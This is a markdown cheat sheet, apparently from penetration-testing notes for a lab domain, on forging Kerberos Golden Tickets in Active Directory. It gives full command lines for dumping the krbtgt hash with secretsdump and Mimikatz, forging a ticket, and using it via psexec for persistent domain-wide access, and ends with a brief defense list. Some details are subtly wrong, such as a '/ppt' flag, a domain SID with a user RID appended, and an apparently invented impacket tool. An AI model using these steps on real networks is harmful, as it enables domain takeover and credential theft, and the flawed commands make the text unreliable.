# GOLDEN TICKET ATTACKS

Create arbitrary Kerberos Ticket-Granting Tickets (TGTs) signed with the krbtgt account's NTLM hash. This grants indefinite access to the entire domain even if passwords are changed.

## Overview

- **What it is**: Forged Kerberos TGT ticket signed with krbtgt NTLM hash
- **Impact**: Persistent domain-wide access, bypasses all password resets
- **Timeline**: Persists until krbtgt hash is changed (typically 10+ years)
- **Detection**: Very difficult to detect, creates minimal audit trail
- **Goal**: Permanent persistence in compromised domain

## Prerequisites

You need:
1. Domain SID (can be obtained from any user's SID)
2. krbtgt account NTLM hash (dumped from NTDS.dit or DC memory)
3. Domain name

## Dump krbtgt Hash

### Using Impacket Secretsdump (Most Reliable)

From compromised DC or with domain admin credentials:

```bash
impacket-secretsdump MARVEL.local/administrator:Password1@10.0.2.15 -just-dc-nthash
```

Look for the krbtgt account hash.

### Using Mimikatz (Windows)

Requires SYSTEM privileges on DC:

```bash
mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt
```

Capture the NTLM hash value.

## Create Golden Ticket

### Using Mimikatz

```bash
mimikatz.exe
kerberos::golden /user:Administrator_fake /domain:marvel.local /sid:S-1-5-21-1987370270-658711371-1957994488-500 /krbtgt:abc123def456ghi789jkl012mno345 /id:500 /ppt
```

Parameters:
- `/user`: Fake username to create in ticket
- `/domain`: Full domain name (marvel.local)
- `/sid`: Domain SID (run: whoami /all to get from existing user)
- `/krbtgt`: NTLM hash of krbtgt account
- `/id`: RID 500 = Domain Admin; set to actual RID if spoofing specific user
- `/ppt`: Inject into current process immediately

### Verify Ticket Creation

```bash
klist
```

Should show your forged ticket.

## Use Golden Ticket for Access

Once ticket is created and injected:

```bash
net use \\dc.marvel.local\c$
psexec \\dc.marvel.local cmd
```

You can now access any resource in the domain as the spoofed user.

## Obtaining Domain SID

```bash
whoami /all
# Look for "Domain SID" line

# Or use:
impacket-getdomain MARVEL.local/fcastle:Password1@10.0.2.15
```

## Defense

- Change krbtgt password twice (forward and backward)
- Monitor for Kerberos TGT requests with unusual SIDs
- Enable Kerberos armoring (AES encryption)
- Implement administrative tier model
- Monitor krbtgt hash in NTDS.dit for unauthorized access
- Enable detailed Kerberos logging (Event ID 4769)
- Regular security audits of privileged accounts